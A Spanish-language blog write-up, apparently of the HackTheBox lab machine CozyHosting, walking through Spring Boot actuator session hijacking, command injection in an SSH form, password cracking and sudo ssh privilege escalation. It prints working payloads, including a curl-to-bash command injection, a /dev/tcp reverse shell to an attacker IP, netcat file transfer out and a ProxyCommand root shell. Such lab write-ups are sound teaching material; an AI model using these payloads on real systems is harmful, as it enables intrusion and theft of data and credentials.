---
layout      : post
title       : "HackTheBox - CozyHosting"
author      : lanz
image       : https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/cozyhosting/htb559_banner.png
category    : [ htb ]
tags        : [ spring-boot, actuators, cookie-hijacking, command-injection, cracking ]
---
Entorno **Linux** nivel facil. Temitas con **Spring Boot** y sus **Actuators**, las usaremos para robar sesiones y aparte inyectaremos comandos por montones (qué tal la rima ah?).

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/cozyhosting/htb559_cozyhostingHTB.png" style="width: 100%;"/>

## TL;DR (Spanish writeup)

**Laboratorio creado por**: [commandercool](https://www.hackthebox.eu/profile/1005191).

Actua normal 😧

Contaremos con un sitio web creado con **Spring Boot** (**Java**), jugaremos con los **Actuators** para recorrer y descubrir las sesiones que esten interactuando con el sitio web. Entre ellas tendremos al usuario **kanderson**, mediante un secuestro de sesiones lograremos convertirnos en él dentro del sitio.

Siguiendo nuestro camino aprovecharemos una conexión que intenta el servidor para conectarse a un servicio SSH, jugaremos a inyectar comandos y conseguiremos finalmente ejecutar comandos como el usuario **app**.

Como casi ultimo paso, exploraremos el codigo fuente del servidor para jugar con bases de datos y cracking, moviendonos lateralmente al usuario **josh** en el sistema.

**Josh**, tendra el permiso de ejecutar el comando **/usr/bin/ssh** como el usuario **root**, usaremos las "**opciones**" de la herramienta para inyectar comandos como el usuario **root**.

...

### Clasificación de la máquina según la gentesita

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/cozyhosting/htb559_statistics.png" style="width: 80%;"/>

Una máquina que tiene de todo, pero destaca un poco que debemos enumerar mas o menos mucho, seguro nos divertira.

> La idea inicial de esta locura es tener mis "notas" por si algun día se me olvida todo (lo que es muuuy probable), leer esto y reencontrarme (o talvez no) 😄 La segunda idea surgio con el tiempo, ya que me di cuenta que esta es una puerta para personitas que como yo al inicio (o simplemente a veces) nos estancamos en este mundo de la seguridad, por lo que si tengo la oportunidad de ayudarlos ¿por qué no hacerlo?

> Un detalle es que si ves mucho texto, es por que me gusta mostrar tanto errores como exitos y tambien plasmar todo desde una perspectiva más de enseñanza que de solo pasos a seguir. Sin menos, muchas gracias <3

...

Emoji: Cara Angustiada :P

1. [Reconocimiento](#reconocimiento).
2. [Enumeración](#enumeracion).
3. [Explotación](#explotacion).
4. [Movimiento lateral: app > josh](#lateral-cloudhostingjar-app2josh).
5. [Escalada de privilegios](#escalada-de-privilegios).

...

# Reconocimiento [#](#reconocimiento) {#reconocimiento}

Como siempre, vamos a empezar viendo que puertos (servicios) están activos en la máquina, para ello usaré `nmap`:

```bash
nmap -p- --open -v 10.10.11.230 -oA TCP_initScan_CozyHosting
```

| Parámetro | Descripción |
| --------- | :---------- |
| -p-       | Escanea todos los 65535 puertos |
| --open    | Devuelve solo los puertos que esten abiertos |
| -v        | Permite ver en consola lo que va encontrando |
| -oA       | Guarda el output en diferentes formatos, uno de ellos "grepeable", lo usaremos junto a la función [extractPorts](https://pastebin.com/raw/X6b56TQ8) de [S4vitar](https://s4vitar.github.io/) para copiar los puertos en la clipboard |

El escaneo nos devuelve:

| Puerto | Descripción |
| ------ | :---------- |
| 22     | **[SSH](https://www.hackingarticles.in/ssh-penetration-testing-port-22/)**: Podemos obtener una terminal de forma segura. |
| 80     | **[HTTP](https://searchnetworking.techtarget.com/definition/port-80)**: Podemos interactuar con un servidor web. |
| 9999   | No sabemos aún que sea. |

> Usando la función `extractPorts` (referenciada antes) podemos tener rápidamente los puertos en la clipboard, en este caso no es necesario (ya que tenemos pocos puertos), pero si tuviéramos varios puertos evitamos tener que escribirlos uno a uno:
 
> ```bash
> extractPorts TCP_initScan_CozyHosting.gnmap
> ```

Ya con los puertos copiados vamos a volver a usar `nmap`, en este caso para que nos ayude a profundizar dandonos tnato la versión del software usado por cada servicio como para que intente (mediante algunos scripts que él tiene) extraernos más info:

```bash
nmap -sCV -p 22,80,9999 10.10.11.230 -v -oA TCP_portScan_CozyHosting
```

| Parámetro | Descripción |
| --------- | :---------- |
| -p        | Escaneo de los puertos obtenidos                       |
| -sC       | Muestra todos los scripts relacionados con el servicio |
| -sV       | Nos permite ver la versión del servicio                |

Finalmente:

| Puerto | Servicio | Versión |
| :----- | :------- | :------ |
| 22     | SSH      | OpenSSH 8.9p1 Ubuntu 3ubuntu0.3 (Ubuntu Linux; protocol 2.0) |
| 80     | HTTP     | nginx 1.18.0 (Ubuntu) |

El servicio web esta realizando una redirección contra el dominio `http://cozyhosting.htb`, jmmm, ya hablaremos de esto ahorita, pero importante saberlo.

Y del puerto `9999` no nos da nada, así que lo tenemos en la mira, pero nos enfocamos por ahora en los otros.

# Enumeración [#](#enumeracion) {#enumeracion}

---

## Recorriendo el sitio web [📌](#enum-puerto-80) {#enum-puerto-80}

Como ya vimos, se nos esta redirigiendo de la IP `10.10.11.230` al dominio `cozyhosting.htb`, lo que pasa es que nuestro sistema no entiende que es eso, por lo que jugaremos con un archivo llamado [/etc/hosts](https://www.redeszone.net/tutoriales/internet/que-es-archivo-hosts/), él, contiene todas las resoluciones que deberia intentar realizar neustro sistema entre direcciones IP y dominios/subdominios, o sea, es el encargado de "traducir" el contenido existente en X IP contra X dominio/subdominio (:

```bash
➧ cat /etc/hosts
...
10.10.11.230    cozyhosting.htb
...
```

Si ahora realizamos una petición contra el sitio web, podremos ver el contenido sin problemas:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/cozyhosting/htb559_page80.png" style="width: 100%;"/>

Un servicio para hostear cositas... Dando vueltas notamos un apartado llamado `Login`, pero no hay nada relevante por ahí.

Revisando y revisando no vemos nada llamativo, así que procedemos a buscar (fuzzing) rutas que se esten hosteando en el sitio web, pero que esten fuera de nuestra vista:

```bash
ffuf -c -w /opt/seclists/Discovery/Web-Content/raft-large-words.txt -u http://cozyhosting.htb/FUZZ
```

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/cozyhosting/htb559_bash_ffuf_words_page80.png" style="width: 100%;"/>

Algunas rutas, pero la más curiosa y profunda es `/error`:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/cozyhosting/htb559_page80error.png" style="width: 100%;"/>

Podemos pensar que es un error inocente y nada más, pero si detallamos y dudamos, nos esta contando varias cosas, ya que al preguntar en internet sobre "`Whitelabel Error Page`", obtenemos:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/cozyhosting/htb559_google_errorWhitelaberErrorPage.png" style="width: 100%;"/>

Nos enfrentamos a un sitio web creado con `Spring Boot`:

> [Spring Boot](https://spring.io/projects/spring-boot) es basicamente un framework para la creación de sitios web mediante **Java**.

Bien bien, nos vamos encaminando.

Buscando en la web exploits o fallas de seguridad relacionadas a **Spring Boot**, caemos en [este repo](https://github.com/pyn3rd/Spring-Boot-Vulnerability) con varias pruebas a realizar, entre ellas nos cautiva una:

* [Spring Boot RCE Involving H2 Database](https://github.com/pyn3rd/Spring-Boot-Vulnerability#0x06-spring-boot-rce-involving-h2-database)

Si validamos el contenido de esa ruta, nos responde:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/cozyhosting/htb559_bash_curl_page80actuatorEnv.png" style="width: 100%;"/>

Averiguando más y más, entendemos que `Actuator` hace referencia a un conjunto de caracteristicas que podemos agregar a neustro sitio web hosteado con **Spring Boot**:

* [Spring Boot Actuator](https://www.baeldung.com/spring-boot-actuators).
* [Qué son los actuators de Spring Boot](https://luiscualquiera.medium.com/qu%C3%A9-son-los-actuators-de-spring-boot-55cecb48f746).

Y que tiene su API:

* [Spring Boot Actuator Web API Documentation](https://docs.spring.io/spring-boot/docs/current/actuator-api/htmlsingle/)
* [Spring Actuators](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/spring-actuators)

Para interactuar con la API, por ejemplo, [si queremos validar que rutas existen](https://blog.maass.xyz/spring-actuator-security-part-1-stealing-secrets-using-spring-actuators), podemos hacer una petición contra `/actuator`:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/cozyhosting/htb559_bash_curl_page80actuator.png" style="width: 70%;"/>

Hay una que nos llama la atención de primeritas, ¿no?

`Sessions` es un nombre sugerente, quizas podamos ver o hacer algo con las sesiones que esten actualmente, o quizas no y estamos soñando, probemos:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/cozyhosting/htb559_bash_curl_page80actuatorSessions.png" style="width: 70%;"/>

Jmmmm, interesante, hay dos cosas a recalcar:

* Claramente hay un nombre/usuario del cual no teniamos conocimiento (y que procederemos a guardar en nuestras notas).
* La sesión (el valor) tiene un formato muy parecido a nuestra cookie, podemos validarlo facilmente con `BurpSuite`:

  <img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/cozyhosting/htb559_burp_page80actuatorSessions_toSeePatternInCookie.png" style="width: 100%;"/>

Muuuuy llamativo... ¿Que se te ocurre?

...

Podriamos intentar un secuestro/robo de sesión contra el usuario `kanderson` :O O sea, tomar su cookie, modificar la nuestra con la suya y validar a donde nos lleva :P

# Explotación [#](#explotacion) {#explotacion}

> Antes de, te aviso que la cookie va cambiando su valor, como para que no te pierdas si ves distintas cadenas de texto :P

## Pidiendo prestada una cookie [📌](#explotacion-cookie-hijacking-kanderson) {#explotacion-cookie-hijacking-kanderson}

Usaremos `BurpSuite` para hacer más visual esta parte.

Primero hacemos una petición normal, sin modificar nuestra cookie:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/cozyhosting/htb559_burp_page80admin_normalCookie.png" style="width: 100%;"/>

Vemos la redirección hacia el `login`, lo cual es normal, ya que no somos administradores (:

Y ahora tomando la cookie de **kanderson**, modificando la nuestra por esa y realizando la misma petición:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/cozyhosting/htb559_burp_page80admin_kandersonCookie.png" style="width: 100%;"/>

Añañaaaaaai!! Hemos robado la sesión de **kanderson** YYYY resulta que es el administrador del sitio (:

## ex..SSSSHHHH, silencio [📌](#explotacion-executessh-command-injection) {#explotacion-executessh-command-injection}

Repitiendo el proceso, pero ya en el navegador (puedes usar la extensión `Cookie-Editor` para modificar tu cookie, pero hay muchas) encontramos:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/cozyhosting/htb559_page80admin.png" style="width: 100%;"/>

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/cozyhosting/htb559_page80admin_noteAboutCozyScanner.png" style="width: 100%;"/>

El mensaje y campos de escritura nos indica que el sitio web intenta una conexión SSH, pero no sabemos como... 

> El primer pensamiento es que se esta usando `ssh`, la herramienta de linea de comandos. En ese caso nuestro enfoque y pruebas esta en intentar [inyectar comandos](https://owasp.org/www-community/attacks/Command_Injection) maliciosos que causen errores o en el mejor de los casos, una ejecución remota de comandos.

Despues de probar cositas, entendemos que si o si el campo `hostname` debe contener un valor "valido", así sea `1.1.1.1`, pero debe ser algo a lo que la herramienta por detras pueda intentar una conexión (:

Probando y probando, finalmente nos da la luz, y descubrimos la herramienta que esta intentando la conexión SSH:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/cozyhosting/htb559_page80admin_trySSH_req.png" style="width: 100%;"/>

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/cozyhosting/htb559_page80admin_trySSH_res.png" style="width: 100%;"/>

Se esta usando en consola la tool `ssh` 🤭

Basicamente lo que nos esta mostrando es esto:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/cozyhosting/htb559_bash_LOCALtrySSH_commandInjectionInvalid.png" style="width: 70%;"/>

Solo que la linea final no se esta llegando a mostrar... Peeero al validar ingresando contenido antes del intento de inyeccióóóóón:

```txt
Hostname: 10.10.14.164
Username: a`id`;#
```

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/cozyhosting/htb559_page80admin_trySSH_res_idRCE.png" style="width: 100%;"/>

EPALEEEE! Tenemos ejecución remota de comandooooooos (:

Solo que no todo es color de rosa ): Nuestros comandos no estan siendo correctamente ejecutados, peeeero el problema lo encontramos al ejecutar comandos que usen espacios, por ejemplo `cat /etc/passwd`, ese espacio no nos lo esta reconociendo, incluso al colocar `cat+/etc/passwd` o `cat%20/etc/passwd`, por lo que tenemos que lidiar con algo nuevo...

Una simple busqueda en internet tal que: `command injection without white spaces`, nos envia a:

* [How to send a command with arguments without spaces?](https://unix.stackexchange.com/questions/351331/how-to-send-a-command-with-arguments-without-spaces)

Y nos enseña:

```bash
cat${IFS}file.txt
```

> **The default value of** `IFS` **is space**, **tab**, **newline**. All of these characters are whitespace. Consecutive separator characters that are whitespace are treated as a single separator, so the result of the expansion of `cat${IFS}file.txt` is two words: `cat` and `file.txt`.

Me gusta, me gustaaaaa. Con este simple script, le pasamos el comando a ejecutar y nos devolvera la cadena a enviar ya con el valor `${IFS}` reemplazado en lugar de los espacios:

Vamos por ejemplo a intentar entablar una reverse shell:

```py
#!/usr/bin/python3

value = "curl http://10.10.14.164:8000/holas.sh|bash"

new_value = value.replace(" ","${IFS}")
print(f"a`{new_value}`;#")
```

En esta forma de obtener una reverse shell, le diremos al sitio web que haga una petición contra un recurso que estaremos hosteando llamado `holas.sh`, que lea su contenido y posteriormente (`|`) lo ejecute en el sistema mediante una `bash`.

Este es el contenido de `holas.sh`:

```bash
#!/bin/bash

bash -c 'bash -i >& /dev/tcp/10.10.14.164/4440 0>&1'
```

Simplemente indicamos que al ser ejecutado, envie al puerto `4440` de nuestro sistema una `bash`.

* Levantamos puerto **4440**: `nc -lvp 4440`.
* Y levantamos puerto **8000**: `python3 -m http.server`.

Tomamos el valor resultante del script:

```bash
a`curl${IFS}http://10.10.14.164:8000/holas.sh|bash`;#
```

Lo enviamos como **Username** yyyyyyyyyy:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/cozyhosting/htb559_bash_appRevSH.png" style="width: 100%;"/>

# Espiando código: app -> josh [#](#lateral-cloudhostingjar-app2josh) {#lateral-cloudhostingjar-app2josh}

En el sistema encontramos un archivo curioso:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/cozyhosting/htb559_appSH_bash_lsLA_cloudhostingJARfile.png" style="width: 100%;"/>

Podemos pensar que es un backup de la aplicación o incluso el propio codigo fuente usado actualmente.

Como tenemos acceso de lectura, podemos transferirlo a neustro sistema y verlo comodamente, hay muchas maneras, yo usaré `netcat`:

En nuestra máquina de atacantes, levantamos un puerto, indicandole que todo el contenido que llegue a ese puerto lo guarde en un archivo:

```bash
nc -lvp 4441 > cloudhosting-0.0.1.jar
```

Y en la máquina victima, hacemos que genere una conexión contra ese puerto de nuestra máquina, pasandole el contenido del archivo en cuestion:

```bash
nc -w 20 10.10.14.164 4441 < cloudhosting-0.0.1.jar
```

Finalmente validamos la integridad del archivo que enviamos, ejecutamos tanto en la victima como en nuestro sistema:

```bash
md5sum cloudhosting-0.0.1.jar
```

Si nos da el mismo hash, estamos bien (: Si no, repites el proceso.

Descomprimimos el archivo usando `unzip cloudhosting-0.0.1.jar` y nos disponemos a leer y a fisgonear, a ver que encontramos...

En la web tenemos la estructura de un programa `.jar` de **Spring Boot**:

* [The Executable Jar Format](https://docs.spring.io/spring-boot/docs/current/reference/html/executable-jar.html)

En la ruta `/BOOT-INF/classes/application.properties` encontramos unas credenciales para la base de datos:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/cozyhosting/htb559_cloudhostingJARfile_applicationProperties.png" style="width: 100%;"/>

Epale, intentemos conectarnos a la base de datos `cozyhosting`, una de las herramientas usadas para conexioens contra el gestor `PostgreSQL` es `psql`, la usamos tal que:

```bash
psql -h localhost -p 5432 -U postgres -d cozyhosting -W
```

Ingresamos la contraseña y estamos dentro:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/cozyhosting/htb559_appSH_psql_connectionTOpostgresqlDONE.png" style="width: 100%;"/>

Dentro, podemos ver las tablas de la base de datos **cozyhosting** usando:

```sql
\dt
```

Una de ellas es `users` y contiene:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/cozyhosting/htb559_appSH_psql_cozyhostingDB_users.png" style="width: 100%;"/>

Perfecto, hashes para jugar. Los copiamos a nuestra máquina y jugamos con `john` para intentar mediante ataques de fuerza bruta, encontrar un match entre nuestro hash y el hash que genere **john** con cada palabra que saque del diccionario:

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt cozyhosting_psql.hashes
```

Esperamos un ratico yyyyy obtenemos la contraseña en texto plano del usuario `admin`:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/cozyhosting/htb559_bash_john_psqlCozyhostingUsersAdmin_cracked.png" style="width: 100%;"/>

Contra el login del sitio web somos redirigidos al apartado `/error`, peeeero al probar reutilización de contraseñas contra los usuarios del sistema, encontramso que podemos entablar una shell como el usuario `josh`:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/cozyhosting/htb559_appSH_credentialReuse_joshSH.png" style="width: 100%;"/>

(:

# Escalada de privilegios [#](#escalada-de-privilegios) {#escalada-de-privilegios}

Como el usuario `josh` tenemos permiso para ejecutar como el usuario `root` el programa `/usr/bin/ssh` y sus argumentos:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/cozyhosting/htb559_joshSH_sudoL.png" style="width: 100%;"/>

Apoyados de [GTFOBins](https://gtfobins.github.io/) encontramos una manera de aprovechar el permiso para ejecutar comandos como el usuario asociado, en este caso **root**:

* [https://gtfobins.github.io/gtfobins/ssh/#sudo](https://gtfobins.github.io/gtfobins/ssh/#sudo)

Esto usando a **opción** `ProxyCommand` de la herramienta:

> Para profundizar, ejecuta `man ssh config` y busca `ProxyCommand`.

Simplemente ejecutando:

```bash
sudo /usr/bin/ssh -o ProxyCommand=';bash 0<&2 1>&2' x
```

Somos **root**:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/cozyhosting/htb559_joshSH_sudoSSHoptionPROXYCOMMANDrce_rootSH.png" style="width: 100%;"/>

Y listooooones (:

# Post-Explotación [#](#post-explotacion) {#post-explotacion}

---

## Flags [📌](#post-exploitation-flags) {#post-exploitation-flags}

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/cozyhosting/htb559_flags.png" style="width: 100%;"/>

...

Hemos terminado la resolución de la máquina. Muy entretenida, el como llegamos a robarle la cookie a `kanderson` me gustó mucho.

Espero que tambien te haya gustado, nos leeremos pronto, abrazos y a seguir rompiendo de TODOOOOOOOOO!!!